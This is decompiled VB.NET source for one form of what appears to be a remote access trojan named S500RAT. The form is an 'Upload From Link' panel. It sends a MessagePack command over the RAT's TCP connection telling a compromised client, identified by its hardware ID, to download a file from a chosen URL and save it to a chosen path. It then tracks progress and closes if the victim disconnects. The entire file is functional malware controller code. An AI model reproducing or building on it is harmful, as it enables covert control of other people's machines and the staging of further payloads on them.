Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Text
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x0200003E RID: 62
	<DesignerGenerated()>
	Public Partial Class UploadFromLink
		Inherits Form

		' Token: 0x0600114B RID: 4427 RVA: 0x00095374 File Offset: 0x00093574
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.UploadFromLink_Load
			AddHandler MyBase.Resize, AddressOf Me.UploadFromLink_Resize
			Me.FormSize = False
			Me.IsConnected = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x1700070D RID: 1805
		' (get) Token: 0x0600114E RID: 4430 RVA: 0x00096379 File Offset: 0x00094579
		' (set) Token: 0x0600114F RID: 4431 RVA: 0x00096383 File Offset: 0x00094583
		Public Overridable Property NameForm As UILabel

		' Token: 0x1700070E RID: 1806
		' (get) Token: 0x06001150 RID: 4432 RVA: 0x0009638C File Offset: 0x0009458C
		' (set) Token: 0x06001151 RID: 4433 RVA: 0x00096396 File Offset: 0x00094596
		Friend Overridable Property TextBoxLink As Guna2TextBox

		' Token: 0x1700070F RID: 1807
		' (get) Token: 0x06001152 RID: 4434 RVA: 0x0009639F File Offset: 0x0009459F
		' (set) Token: 0x06001153 RID: 4435 RVA: 0x000963AC File Offset: 0x000945AC
		Friend Overridable Property UploadFile As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._UploadFile
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.UploadFile_Click
				Dim uploadFile As Guna2GradientButton = Me._UploadFile
				If uploadFile IsNot Nothing Then
					RemoveHandler uploadFile.Click, value2
				End If
				Me._UploadFile = value
				uploadFile = Me._UploadFile
				If uploadFile IsNot Nothing Then
					AddHandler uploadFile.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000710 RID: 1808
		' (get) Token: 0x06001154 RID: 4436 RVA: 0x000963EF File Offset: 0x000945EF
		' (set) Token: 0x06001155 RID: 4437 RVA: 0x000963FC File Offset: 0x000945FC
		Friend Overridable Property TextBox1Name As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._TextBox1Name
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As EventHandler = AddressOf Me.TextBox1Name_TextChanged
				Dim textBox1Name As Guna2TextBox = Me._TextBox1Name
				If textBox1Name IsNot Nothing Then
					RemoveHandler textBox1Name.TextChanged, value2
				End If
				Me._TextBox1Name = value
				textBox1Name = Me._TextBox1Name
				If textBox1Name IsNot Nothing Then
					AddHandler textBox1Name.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000711 RID: 1809
		' (get) Token: 0x06001156 RID: 4438 RVA: 0x0009643F File Offset: 0x0009463F
		' (set) Token: 0x06001157 RID: 4439 RVA: 0x00096449 File Offset: 0x00094649
		Public Overridable Property FileSave As Label

		' Token: 0x17000712 RID: 1810
		' (get) Token: 0x06001158 RID: 4440 RVA: 0x00096452 File Offset: 0x00094652
		' (set) Token: 0x06001159 RID: 4441 RVA: 0x0009645C File Offset: 0x0009465C
		Private Overridable Property label3 As Label

		' Token: 0x17000713 RID: 1811
		' (get) Token: 0x0600115A RID: 4442 RVA: 0x00096465 File Offset: 0x00094665
		' (set) Token: 0x0600115B RID: 4443 RVA: 0x0009646F File Offset: 0x0009466F
		Friend Overridable Property ClientInfo As Label

		' Token: 0x17000714 RID: 1812
		' (get) Token: 0x0600115C RID: 4444 RVA: 0x00096478 File Offset: 0x00094678
		' (set) Token: 0x0600115D RID: 4445 RVA: 0x00096484 File Offset: 0x00094684
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000715 RID: 1813
		' (get) Token: 0x0600115E RID: 4446 RVA: 0x000964C7 File Offset: 0x000946C7
		' (set) Token: 0x0600115F RID: 4447 RVA: 0x000964D4 File Offset: 0x000946D4
		Friend Overridable Property Timer2 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000716 RID: 1814
		' (get) Token: 0x06001160 RID: 4448 RVA: 0x00096517 File Offset: 0x00094717
		' (set) Token: 0x06001161 RID: 4449 RVA: 0x00096521 File Offset: 0x00094721
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000717 RID: 1815
		' (get) Token: 0x06001162 RID: 4450 RVA: 0x0009652A File Offset: 0x0009472A
		' (set) Token: 0x06001163 RID: 4451 RVA: 0x00096534 File Offset: 0x00094734
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000718 RID: 1816
		' (get) Token: 0x06001164 RID: 4452 RVA: 0x00096577 File Offset: 0x00094777
		' (set) Token: 0x06001165 RID: 4453 RVA: 0x00096581 File Offset: 0x00094781
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000719 RID: 1817
		' (get) Token: 0x06001166 RID: 4454 RVA: 0x0009658A File Offset: 0x0009478A
		' (set) Token: 0x06001167 RID: 4455 RVA: 0x00096594 File Offset: 0x00094794
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x1700071A RID: 1818
		' (get) Token: 0x06001168 RID: 4456 RVA: 0x0009659D File Offset: 0x0009479D
		' (set) Token: 0x06001169 RID: 4457 RVA: 0x000965A7 File Offset: 0x000947A7
		Friend Overridable Property ProgressBar1 As Guna2ProgressBar

		' Token: 0x0600116A RID: 4458 RVA: 0x000965B0 File Offset: 0x000947B0
		Private Sub UploadFromLink_Load(sender As Object, e As EventArgs)
			Try
				Me.MinimumSize = MyBase.Size
				Me.MaximumSize = MyBase.Size
				Me.ClientInfo.Text = Me.Info
				Me.FormSize = True
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600116B RID: 4459 RVA: 0x00096614 File Offset: 0x00094814
		Private Sub UploadFromLink_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x0600116C RID: 4460 RVA: 0x000966A5 File Offset: 0x000948A5
		Private Sub TextBox1Name_TextChanged(sender As Object, e As EventArgs)
			Me.FileSave.Text = Conversions.ToString(Me.InstallationPath())
		End Sub

		' Token: 0x0600116D RID: 4461 RVA: 0x000966C0 File Offset: 0x000948C0
		Private Function InstallationPath() As Object
			Return Me.PatshSave + Me.TextBox1Name.Text
		End Function

		' Token: 0x0600116E RID: 4462 RVA: 0x000966EC File Offset: 0x000948EC
		Private Sub UploadFile_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.UploadFile.Text, "Finish", False) = 0
			If flag Then
				MyBase.Close()
			End If
			Me.UploadFile.Enabled = False
			Me.TextBox1Name.Enabled = False
			Me.UploadFile.Text = "Please wait..."
			Me.TextBoxLink.Enabled = False
			Me.FileSave.Enabled = False
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "fileManager"
			msgPack.ForcePathObject("Command").AsString = "Uploadink"
			msgPack.ForcePathObject("LNK").AsString = Me.TextBoxLink.Text
			msgPack.ForcePathObject("Save").AsString = Me.FileSave.Text
			msgPack.ForcePathObject("DWID").AsString = Me.HWID
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x0600116F RID: 4463 RVA: 0x00096804 File Offset: 0x00094A04
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim isConnected As Boolean = Me.IsConnected
			If isConnected Then
				Try
					Dim flag As Boolean = Not Me.Client.TcpClient.Connected
					If flag Then
						MyBase.Close()
					End If
				Catch ex As Exception
					MyBase.Close()
				End Try
			End If
		End Sub

		' Token: 0x06001170 RID: 4464 RVA: 0x00096868 File Offset: 0x00094A68
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			Dim isConnected As Boolean = Me.IsConnected
			If isConnected Then
				Try
					Me.ProgressBar1.Value = Conversions.ToInteger(Me.Complete)
					Dim flag As Boolean = Conversions.ToDouble(Me.Complete) = 100.0
					If flag Then
						Me.UploadFile.Enabled = True
						Me.TextBox1Name.Enabled = True
						Me.TextBoxLink.Enabled = True
						Me.FileSave.Enabled = True
						Me.UploadFile.Text = "Finish"
						Me.Timer2.[Stop]()
					End If
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06001171 RID: 4465 RVA: 0x00096938 File Offset: 0x00094B38
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x040007CC RID: 1996
		Public Client As Clients

		' Token: 0x040007CD RID: 1997
		Public Info As String

		' Token: 0x040007CE RID: 1998
		Private FormSize As Boolean

		' Token: 0x040007CF RID: 1999
		Public PatshSave As String

		' Token: 0x040007D0 RID: 2000
		Public HWID As String

		' Token: 0x040007D1 RID: 2001
		Public Complete As String

		' Token: 0x040007D2 RID: 2002
		Public IsConnected As Boolean
	End Class
End Namespace
